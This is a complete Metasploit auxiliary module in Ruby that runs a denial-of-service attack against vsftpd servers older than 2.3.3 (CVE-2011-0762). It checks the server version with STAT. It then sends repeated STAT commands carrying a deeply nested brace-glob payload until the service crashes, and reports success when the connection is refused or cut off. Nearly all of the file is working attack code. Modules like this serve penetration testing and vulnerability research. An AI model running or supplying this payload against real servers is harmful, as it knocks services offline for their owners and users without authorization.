##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'	=> 'VSFTPD 2.3.2 Denial of Service',
        'Description'	=> %q{
          This module triggers a Denial of Service condition in the VSFTPD server in
          versions before 2.3.3. So far, it has been tested on 2.3.0, 2.3.1, and 2.3.2.
        },
        'Author' => [
          'Nick Cottrell (Rad10Logic) <ncottrellweb[at]gmail.com>', # Module Creator
          'Anna Graterol <annagraterol95[at]gmail.com>', # Vuln researcher
          'Mana Mostaani <mana.mostaani[at]gmail.com>',
          'Maksymilian Arciemowicz' # Original EDB PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'BID', '46617' ],
          [ 'CVE', '2011-0762' ],
          [ 'EDB', '16270' ]
        ],
        'DisclosureDate' => '2011-02-03',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
      )
    )
  end

  def check
    # attempt to connect
    begin
      if !connect_login
        print_error('Connection refused.')
        return Exploit::CheckCode::Unknown
      end
    rescue Rex::ConnectionRefused
      print_error('Connection refused.')
      return Exploit::CheckCode::Unknown
    rescue Rex::ConnectionTimeout
      print_error('Connection timed out')
      return Exploit::CheckCode::Unknown
    end
    s = ''
    loop do
      # get each line until our desired line shows or end line shows
      s = send_cmd(['STAT'], true)
      break if (s =~ /vsFTPd \d+\.\d+\.\d+/) || (s == "211 End of status\r\n")
    end
    disconnect
    # check if version was found
    if s !~ /vsFTPd \d+\.\d+\.\d+/
      print_error('Did not find ftp version in FTP session.')
      return Exploit::CheckCode::Unknown
    end

    # pull out version and check if its in range of vulnerability
    version = s[/\d+\.\d+\.\d+/]
    if Rex::Version.new(version) < Rex::Version.new('2.3.3')
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    fail_with(Failure::NotVulnerable, 'Target is not vulnerable.') if check != Exploit::CheckCode::Appears

    payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487

    vprint_status("Payload being sent: #{payload}")
    print_status('sending payload')

    loop do
      print('.')
      connect_login
      10.times do
        send_cmd([payload.to_s], false)
      end
      send_cmd([payload.to_s], true)
      disconnect
    rescue Rex::ConnectionTimeout
      print("\n")
      print_error('Connection timeout! Sending again')
    rescue Errno::ECONNRESET
      print("\n")
      print_error('Connection reset!')
    rescue Rex::ConnectionRefused
      print("\n")
      print_good('Connection refused! Appears DOS attack succeeded.')
    rescue EOFError
      print("\n")
      print_good('Stream was cut off abruptly. Appears DOS attack succeeded.')
      break
    end
    disconnect
  end
end
